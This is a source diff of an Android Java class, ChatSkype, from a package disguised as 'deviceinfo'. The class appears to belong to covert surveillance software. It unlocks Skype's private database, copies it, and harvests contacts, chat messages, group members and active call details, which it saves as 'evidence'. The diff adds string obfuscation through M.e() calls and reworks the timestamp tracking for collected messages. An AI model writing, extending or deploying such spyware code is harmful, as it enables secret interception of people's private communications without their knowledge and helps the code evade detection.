@@ -24,6 +24,7 @@ import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.manager.ManagerModule;
 
 import com.android.deviceinfo.module.ModuleAddressBook;
+import com.android.deviceinfo.module.call.CallInfo;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
 import com.android.m.M;
@@ -32,11 +33,10 @@ public class ChatSkype extends SubModuleChat {
 	private static final String TAG = "ChatSkype";
 
 	private static final int PROGRAM = 0x01;
-	String pObserving = "skype";
+	String pObserving = M.e("com.skype");
 
 	private Date lastTimestamp;
-
-	private Hashtable<String, Long> lastSkype;
+	
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
 	ChatGroups groups = new ChatSkypeGroups();
@@ -66,7 +66,7 @@ public class ChatSkype extends SubModuleChat {
 
 	@Override
 	protected void start() {
-		lastSkype = markup.unserialize(new Hashtable<String, Long>());
+		
 		try {
 			readSkypeMessageHistory();
 		} catch (IOException e) {
@@ -75,9 +75,6 @@ public class ChatSkype extends SubModuleChat {
 			}
 		}
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (start), read lastSkype: " + lastSkype);
-		}
 	}
 
 	@Override
@@ -99,10 +96,8 @@ public class ChatSkype extends SubModuleChat {
 			return;
 		}
 		try {
-			boolean updateMarkup = false;
 
 			// k_0=/data/data/com.skype.raider/files
-
 			String account = readAccount();
 
 			if (account == null || account.length() == 0)
@@ -110,6 +105,11 @@ public class ChatSkype extends SubModuleChat {
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readSkypeMessageHistory) account: " + account);
+			}
+			
+			long lastSkype = markup.unserialize(new Long(0));
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (start), read lastSkype: " + lastSkype);
 			}
 
 			GenericSqliteHelper helper = openSkypeDBHelper(account);
@@ -120,31 +120,33 @@ public class ChatSkype extends SubModuleChat {
 					saveSkypeContacts(helper);
 				}
 
+				long maxLast=0;
 				List<SkypeConversation> conversations = getSkypeConversations(helper, account);
 				for (SkypeConversation sc : conversations) {
 					String peer = sc.remote;
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + peer + " lastReadIndex: "
-								+ sc.lastReadIndex);
+						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + peer + " timestamp: "
+								+ new Date(sc.timestamp));
 					}
 					groups = new ChatSkypeGroups();
 
-					// retrieves the lastConvId recorded as evidence for this
-					// conversation
-					long lastConvId = lastSkype.containsKey(account + peer) ? lastSkype.get(account + peer) : 0;
-
-					if (sc.lastReadIndex > lastConvId) {
+					if (sc.timestamp > lastSkype) {
 						if (groups.isGroup(peer) && !groups.hasMemoizedGroup(peer)) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (readSkypeMessageHistory) fetch group: " + peer);
+							}
 							fetchGroup(helper, peer);
 						}
 
-						int lastReadId = (int) fetchMessages(helper, sc, lastConvId);
-						if (lastReadId > 0) {
-							updateMarkupSkype(account + peer, lastReadId, true);
-						}
+						long lastTimestamp =  fetchMessages(helper, sc, lastSkype);
+						maxLast = Math.max(lastTimestamp, maxLast);
 					}
 				}
-
+				
+				if (maxLast > 0) {
+					markup.serialize(maxLast);
+				}
+				helper.deleteDb();
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readSkypeMessageHistory) Error, null helper");
@@ -173,7 +175,7 @@ public class ChatSkype extends SubModuleChat {
 		String dbFile = dbDir + "/" + account + M.e("/main.db");
 		Path.unprotect(dbDir + "/" + account, true);
 		Path.unprotect(dbFile, true);
-		Path.unprotect(dbFile + "-journal", true);
+		Path.unprotect(dbFile + M.e("-journal"), true);
 
 		File file = new File(dbFile);
 
@@ -183,17 +185,18 @@ public class ChatSkype extends SubModuleChat {
 				Check.log(TAG + " (readSkypeMessageHistory): can read DB");
 			}
 
-			helper = GenericSqliteHelper.open(dbFile);
+			helper = GenericSqliteHelper.openCopy(dbFile);
+			helper.deleteAtEnd = false;
 		}
-
+		
 		return helper;
 	}
 
 	private void saveSkypeContacts(GenericSqliteHelper helper) {
-		String[] projection = new String[] { "id", "skypename", "fullname", "displayname", "pstnnumber" };
+		String[] projection = new String[] { M.e("id"), M.e("skypename"), M.e("fullname"), M.e("displayname"), M.e("pstnnumber") };
 
 		boolean tosave = false;
-		RecordVisitor visitor = new RecordVisitor(projection, "is_permanent=1") {
+		RecordVisitor visitor = new RecordVisitor(projection, M.e("is_permanent=1")) {
 
 			@Override
 			public long cursor(Cursor cursor) {
@@ -229,8 +232,8 @@ public class ChatSkype extends SubModuleChat {
 
 		final List<SkypeConversation> conversations = new ArrayList<SkypeConversation>();
 
-		String[] projection = new String[] { "id", "identity", "displayname", "given_displayname", "inbox_message_id" };
-		String selection = "inbox_timestamp > 0 and is_permanent=1";
+		String[] projection = new String[] { M.e("id"), M.e("identity"), M.e("displayname"), M.e("given_displayname"), M.e("inbox_message_id"), M.e("inbox_timestamp") };
+		String selection = M.e("inbox_timestamp > 0 and is_permanent=1");
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
 
@@ -243,6 +246,7 @@ public class ChatSkype extends SubModuleChat {
 				c.displayname = cursor.getString(2);
 				c.given = cursor.getString(3);
 				c.lastReadIndex = cursor.getInt(4);
+				c.timestamp = cursor.getLong(5);
 
 				conversations.add(c);
 				return c.id;
@@ -253,7 +257,7 @@ public class ChatSkype extends SubModuleChat {
 		return conversations;
 	}
 
-	private long fetchMessages(GenericSqliteHelper helper, final SkypeConversation conversation, long lastConvId) {
+	private long fetchMessages(GenericSqliteHelper helper, final SkypeConversation conversation, long lastTimestamp) {
 
 		// select author, body_xml from Messages where convo_id == 118 and id >=
 		// 101 and body_xml != ''
@@ -261,10 +265,10 @@ public class ChatSkype extends SubModuleChat {
 		try {
 			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-			String[] projection = new String[] { "id", "author", "body_xml", "timestamp" };
-			String selection = "type == 61 and convo_id = " + conversation.id + " and body_xml != '' and id > "
-					+ lastConvId;
-			String order = "timestamp";
+			String[] projection = new String[] { M.e("id"), M.e("author"), M.e("body_xml"), M.e("timestamp") };
+			String selection = M.e("type == 61 and convo_id = ") + conversation.id + M.e(" and body_xml != '' and timestamp > ")
+					+ lastTimestamp;
+			String order = M.e("timestamp");
 
 			RecordVisitor visitor = new RecordVisitor(projection, selection, order) {
 
@@ -311,19 +315,19 @@ public class ChatSkype extends SubModuleChat {
 						messages.add(message);
 					}
 
-					return id;
+					return timestamp;
 				}
 			};
 
 			// f_a=messages
 			// M.d("messages")
-			long newLastId = helper.traverseRecords(M.e("messages"), visitor);
+			long newTimeStamp = helper.traverseRecords(M.e("messages"), visitor);
 
 			if (messages != null && messages.size() > 0) {
 				saveEvidence(messages);
 			}
 
-			return newLastId;
+			return newTimeStamp;
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
 				e.printStackTrace();
@@ -336,8 +340,8 @@ public class ChatSkype extends SubModuleChat {
 
 	private void fetchGroup(GenericSqliteHelper helper, final String conversation) {
 
-		String[] projection = new String[] { "identity" };
-		String selection = "chatname = '" + conversation + "'";
+		String[] projection = new String[] { M.e("identity") };
+		String selection = M.e("chatname = '") + conversation + "'";
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
 			@Override
@@ -348,7 +352,7 @@ public class ChatSkype extends SubModuleChat {
 			}
 		};
 
-		helper.traverseRecords("ChatMembers", visitor);
+		helper.traverseRecords(M.e("ChatMembers"), visitor);
 	}
 
 	public static String readAccount() {
@@ -362,11 +366,11 @@ public class ChatSkype extends SubModuleChat {
 		try {
 			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
 			Document doc = builder.parse(new File(confFile));
-			NodeList defaults = doc.getElementsByTagName("Default");
+			NodeList defaults = doc.getElementsByTagName(M.e("Default"));
 			for (int i = 0; i < defaults.getLength(); i++) {
 				Node d = defaults.item(i);
 				Node p = d.getParentNode();
-				if ("Account".equals(p.getNodeName())) {
+				if (M.e("Account").equals(p.getNodeName())) {
 					account = d.getFirstChild().getNodeValue();
 					break;
 				}
@@ -380,32 +384,15 @@ public class ChatSkype extends SubModuleChat {
 		return account;
 	}
 
-	private void updateMarkupSkype(String account, long newLastId, boolean serialize) {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (updateMarkupSkype), mailStore: " + account + " +lastId: " + newLastId);
-		}
 
-		lastSkype.put(account, newLastId);
-		try {
-			if (serialize || (newLastId % 10 == 0)) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (updateMarkupSkype), write lastId: " + newLastId);
-				}
-				markup.writeMarkupSerializable(lastSkype);
-			}
-		} catch (IOException e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (updateMarkupSkype) Error: " + e);
-			}
-		}
-	}
 
 	public void saveEvidence(ArrayList<MessageChat> messages) {
 		getModule().saveEvidence(messages);
 	}
 
 	public static boolean getCurrentCall(GenericSqliteHelper helper, final CallInfo callInfo) {
-		String sqlQuery= "select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id order by ca.id desc limit 1";
+		// select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id order by ca.id desc limit 1
+		String sqlQuery= M.e("select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id and is_active = 1 order by ca.id desc limit 1");
 		
 		RecordVisitor visitor = new RecordVisitor() {
 
@@ -425,6 +412,16 @@ public class ChatSkype extends SubModuleChat {
 
 		helper.traverseRawQuery(sqlQuery, new String[]{}, visitor);
 		return callInfo.valid;
+	}
+	
+	public class ChatSkypeGroups extends ChatGroups {
+
+		@Override
+		boolean isGroup(String peer) {
+			
+			return peer.startsWith("#");
+		}
+
 	}
 
 }
